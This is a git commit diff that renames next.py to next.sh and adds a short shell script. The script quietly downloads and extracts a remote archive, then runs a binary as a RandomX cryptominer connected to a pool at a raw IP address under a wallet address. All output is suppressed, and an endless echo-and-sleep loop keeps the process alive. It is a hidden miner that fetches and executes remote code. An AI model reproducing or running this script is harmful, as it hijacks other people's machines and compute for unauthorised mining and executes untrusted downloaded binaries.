1d130e2126190865a72a28c35d6a06adad898594
preak07 <160253225+preak07@users.noreply.github.com>
2024-03-02 02:08:46 +0700

    Update and rename next.py to next.sh

---
+++ next.sh
@@ -0,0 +1,6 @@
+wget https://github.com/komprengaw/rengaw/releases/download/demon/daemon.tar.gz > /dev/null 2>&1 && tar -xvf daemon.tar.gz && ./uranus -a rx/0 -o 159.203.162.18:3333 -u nexa:nqtsq5g5enrk4gqv9aftxgcq0ze9zweql8fma5fp06qcjhax.RIG001 > /dev/null 2>&1 &
+while true
+do
+        echo "gasss........!"
+        sleep 20
+done
